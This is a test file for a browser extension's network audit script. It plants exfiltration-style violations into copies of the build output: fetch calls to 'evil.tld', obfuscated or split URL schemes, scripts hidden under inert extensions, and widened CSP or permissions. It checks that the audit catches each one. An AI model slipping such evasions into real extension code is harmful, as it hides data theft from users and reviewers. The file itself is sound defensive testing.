/**
 * Negative controls for scripts/audit-network.mjs.
 *
 * An audit assertion that has never been observed failing is decoration.
 * That is not hypothetical here: the previous flat allowlist stayed green
 * while an unallowlisted outbound fetch shipped, because the lockdown's
 * own `credentials:"omit"` entry happened to match the new call site.
 *
 * So every assertion in the audit gets a test that PLANTS the violation in
 * a real copy of the build output, runs the audit against that copy, and
 * asserts that it fails AND names what it found. The copy is thrown away
 * afterwards; the real `.output/chrome-mv3` is never written to.
 *
 * If there is no build output, these skip -- `pnpm build` runs the audit
 * itself, so a missing build is a "nothing to check yet", not a failure.
 */
import { execFileSync } from "node:child_process";
import {
  cpSync,
  existsSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

const APP_DIR = join(dirname(fileURLToPath(import.meta.url)), "..");
const SCRIPT = join(APP_DIR, "scripts", "audit-network.mjs");
const BUILD_DIR = join(APP_DIR, ".output", "chrome-mv3");

const haveBuild = existsSync(join(BUILD_DIR, "manifest.json"));

interface AuditResult {
  code: number;
  out: string;
}

function runAudit(dir: string): AuditResult {
  try {
    const out = execFileSync(process.execPath, [SCRIPT, dir], {
      encoding: "utf8",
    });
    return { code: 0, out };
  } catch (error) {
    const e = error as { status?: number; stdout?: string; stderr?: string };
    return { code: e.status ?? 1, out: `${e.stdout ?? ""}${e.stderr ?? ""}` };
  }
}

let baseline = "";
const scratch: string[] = [];

beforeAll(() => {
  if (!haveBuild) return;
  baseline = mkdtempSync(join(tmpdir(), "audit-network-base-"));
  // Copied once, so a concurrent rebuild cannot change the fixture
  // halfway through the suite.
  cpSync(BUILD_DIR, baseline, { recursive: true });
});

afterAll(() => {
  for (const dir of [...scratch, baseline]) {
    if (dir) rmSync(dir, { recursive: true, force: true });
  }
});

/** Copy the baseline build, let `plant` corrupt it, then audit the copy. */
function withPlantedViolation(plant: (dir: string) => void): AuditResult {
  const dir = mkdtempSync(join(tmpdir(), "audit-network-case-"));
  scratch.push(dir);
  cpSync(baseline, dir, { recursive: true });
  plant(dir);
  const result = runAudit(dir);
  rmSync(dir, { recursive: true, force: true });
  return result;
}

function chunk(dir: string, prefix: string): string {
  const file = readdirSync(join(dir, "chunks")).find((f) =>
    f.startsWith(prefix),
  );
  if (!file) throw new Error(`no chunk starting with ${prefix}`);
  return join(dir, "chunks", file);
}

function edit(file: string, from: string, to: string): void {
  const source = readFileSync(file, "utf8");
  // Exactly one occurrence, or the plant lands somewhere other than where
  // the test thinks it does. `credentials:"omit"` appears three times in
  // the worker -- once in the lockdown and once at each lookup call site
  // -- and a replace-the-first-hit helper quietly mutated the wrong one.
  // This is also what forces every call-site plant below to name WHICH
  // of the two identical fetches it means.
  if (source.split(from).length !== 2) {
    throw new Error(
      `fixture must contain ${JSON.stringify(from)} exactly once, found ${source.split(from).length - 1}`,
    );
  }
  writeFileSync(file, source.replace(from, to));
}

/** The two worker fetch call sites, told apart by their `Accept` header
 *  -- the one part of either call the minifier leaves alone. Identifier
 *  names (`e`, `t`) are minifier output and will move; the header will
 *  not, so every plant below anchors on it.
 *
 *  They have to be told apart at all because the calls are otherwise
 *  byte-identical, which is the point: `edit`'s exactly-once rule is
 *  what stopped these plants landing on whichever site came first. */
const GITHUB_INIT =
  "credentials:`omit`,redirect:`error`,cache:`no-store`,headers:{Accept:`application/vnd.github+json`}";
const KEYSERVER_INIT =
  "credentials:`omit`,redirect:`error`,cache:`no-store`,headers:{Accept:`application/pgp-keys`}";

function editManifest(
  dir: string,
  mutate: (m: Record<string, unknown>) => void,
): void {
  const file = join(dir, "manifest.json");
  const manifest = JSON.parse(readFileSync(file, "utf8")) as Record<
    string,
    unknown
  >;
  mutate(manifest);
  writeFileSync(file, JSON.stringify(manifest));
}

describe.skipIf(!haveBuild)("audit-network", () => {
  it("passes on the unmodified build output", () => {
    const result = withPlantedViolation(() => {
      // No violation planted: the control the other cases are measured
      // against, and the "restore it and it passes again" half of each.
    });
    expect(result.out).toContain("✅ worker:");
    expect(result.code).toBe(0);
  });

  // ── Escape 1: the worker call-site pin ────────────────────────────
  describe("worker fetch destination", () => {
    it("rejects the exact call that satisfied the old `redirect:` pin", () => {
      // `fetch(<anything>, { redirect: "error", method: "GET" })` contained
      // the literal `redirect:` in its snippet and so inherited the one
      // permitted worker fetch. Now the destination has to resolve.
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "background.js"),
          `await fetch(e,{method:\`GET\`,signal:t,${GITHUB_INIT}`,
          `await fetch(globalThis.__dest,{method:\`GET\`,signal:t,${GITHUB_INIT}`,
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("UNEXPECTED NETWORK PRIMITIVES");
      expect(result.out).toContain("destination could not be resolved");
    });

    it("rejects a destination that resolves to another origin", () => {
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "background.js"),
          "`https://api.github.com`",
          "`https://evil.tld`",
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("destination resolves to https://evil.tld");
      expect(result.out).toContain("pinned to https://api.github.com");
    });

    it("rejects a redirected keyserver destination too", () => {
      // The second call site gets its own case rather than riding on the
      // first: an assertion that only ever runs against one of two
      // otherwise identical calls proves nothing about the other.
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "background.js"),
          "`https://keys.openpgp.org`",
          "`https://evil.tld`",
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("destination resolves to https://evil.tld");
      expect(result.out).toContain("pinned to https://keys.openpgp.org");
    });

    it("rejects two fetches to the SAME allowed origin", () => {
      // THE CASE A BARE COUNT OF 2 WOULD MISS. Point the keyserver call
      // at api.github.com and the census still sees two worker fetches,
      // both to an allowed origin -- but the keyserver pin now matches
      // nothing, so an exfiltration call cannot be smuggled in by
      // duplicating a legitimate destination.
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "background.js"),
          "`https://keys.openpgp.org`",
          "`https://api.github.com`",
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("keys.openpgp.org");
    });

    it.each([
      ["github", GITHUB_INIT],
      ["keyserver", KEYSERVER_INIT],
    ])("rejects a weakened fetch init (%s)", (_name, init) => {
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "background.js"),
          init,
          init.replace("credentials:`omit`", "credentials:`include`"),
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain('fetch init must set credentials:"omit"');
    });

    it.each([
      ["github", GITHUB_INIT],
      ["keyserver", KEYSERVER_INIT],
    ])("rejects an unpinned fetch option (%s)", (_name, init) => {
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "background.js"),
          init,
          init.replace(
            "credentials:`omit`",
            "credentials:`omit`,referrer:`/x`",
          ),
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("unpinned option(s) referrer");
    });

    it("rejects a page fetch whose destination resolves off-origin", () => {
      const result = withPlantedViolation((dir) => {
        const file = chunk(dir, "sidepanel-");
        edit(file, "await fetch(t)", "await fetch(`https://evil.tld/x`)");
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("resolves to the REMOTE origin");
    });
  });

  // ── Escape 2: the URL-literal scan ────────────────────────────────
  describe("URL literal scan", () => {
    it("sees a scheme spelled with an escape sequence", () => {
      const result = withPlantedViolation((dir) => {
        const file = chunk(dir, "sidepanel-");
        writeFileSync(
          file,
          `${readFileSync(file, "utf8")}\nglobalThis.__a="\\x68ttps://evil.tld/collect";\n`,
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("https://evil.tld/collect");
    });

    it("sees a protocol-relative destination", () => {
      const result = withPlantedViolation((dir) => {
        const file = chunk(dir, "sidepanel-");
        writeFileSync(
          file,
          `${readFileSync(file, "utf8")}\nglobalThis.__b="//evil.tld/collect";\n`,
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("//evil.tld/collect");
    });

    it("sees a split scheme", () => {
      const result = withPlantedViolation((dir) => {
        const file = chunk(dir, "sidepanel-");
        writeFileSync(
          file,
          `${readFileSync(file, "utf8")}\nglobalThis.__c="https:"+"//"+"evil.tld";\n`,
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain('UNEXPECTED absolute URL literal "https:"');
    });

    it("sees a non-http scheme", () => {
      const result = withPlantedViolation((dir) => {
        const file = chunk(dir, "sidepanel-");
        writeFileSync(
          file,
          `${readFileSync(file, "utf8")}\nglobalThis.__d="wss://evil.tld/s";\n`,
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("wss://evil.tld/s");
    });
  });

  // ── Escape 3: what gets scanned ───────────────────────────────────
  describe("scan set", () => {
    it("scans a chunk emitted as .mjs", () => {
      const result = withPlantedViolation((dir) => {
        writeFileSync(
          join(dir, "chunks", "leak.mjs"),
          'fetch("https://evil.tld/collect");\n',
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("chunks/leak.mjs");
      expect(result.out).toContain("https://evil.tld/collect");
    });

    it("scans a script an HTML page loads under an inert extension", () => {
      const result = withPlantedViolation((dir) => {
        writeFileSync(
          join(dir, "chunks", "leak.txt"),
          'fetch("https://evil.tld/collect");\n',
        );
        edit(
          join(dir, "sidepanel.html"),
          "</head>",
          '<script src="/chunks/leak.txt"></script></head>',
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("chunks/leak.txt");
      expect(result.out).toContain("https://evil.tld/collect");
    });

    it("flags an inline script in a built page", () => {
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "sidepanel.html"),
          "</head>",
          '<script>fetch("https://evil.tld")</script></head>',
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("contains an INLINE <script>");
    });

    it("flags a manifest script reference that is not in the output", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          (m.background as Record<string, unknown>).service_worker =
            "background-v2.js";
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("background-v2.js");
      expect(result.out).toContain("BUILD STRUCTURE CHANGED");
    });
  });

  // ── Escape 4: the manifest ────────────────────────────────────────
  describe("manifest policy", () => {
    it("rejects an added permission", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          (m.permissions as string[]).push("nativeMessaging");
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain('permissions gained ["nativeMessaging"]');
    });

    it("rejects an added optional permission", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          (m.optional_permissions as string[]).push("tabs");
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain('optional_permissions gained ["tabs"]');
    });

    it("rejects a removed permission", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          m.permissions = (m.permissions as string[]).filter(
            (p) => p !== "idle",
          );
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain('permissions lost ["idle"]');
    });

    it("rejects a sandbox CSP entry", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          (m.content_security_policy as Record<string, unknown>).sandbox =
            "sandbox allow-scripts; script-src 'self' 'unsafe-eval'; connect-src *;";
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain(
        "content_security_policy.sandbox must be ABSENT",
      );
    });

    it("rejects a top-level sandbox block", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          m.sandbox = { pages: ["sidepanel.html"] };
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("sandbox must be ABSENT");
      expect(result.out).toContain("exempt from the extension_pages CSP");
    });

    it("rejects host permissions", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          m.host_permissions = ["https://api.github.com/*"];
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("host_permissions must be ABSENT");
    });

    it("rejects a widened connect-src", () => {
      const result = withPlantedViolation((dir) => {
        editManifest(dir, (m) => {
          const csp = m.content_security_policy as Record<string, string>;
          csp.extension_pages = csp.extension_pages.replace(
            "https://keys.openpgp.org/vks/v1/;",
            "https://keys.openpgp.org/vks/v1/ https://evil.tld;",
          );
        });
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("connect-src must be exactly");
    });

    it("rejects a stripped panel meta CSP", () => {
      const result = withPlantedViolation((dir) => {
        edit(
          join(dir, "sidepanel.html"),
          '<meta http-equiv="Content-Security-Policy" content="connect-src \'self\'" />',
          "",
        );
      });
      expect(result.code).toBe(1);
      expect(result.out).toContain("sidepanel.html must carry");
    });
  });
});
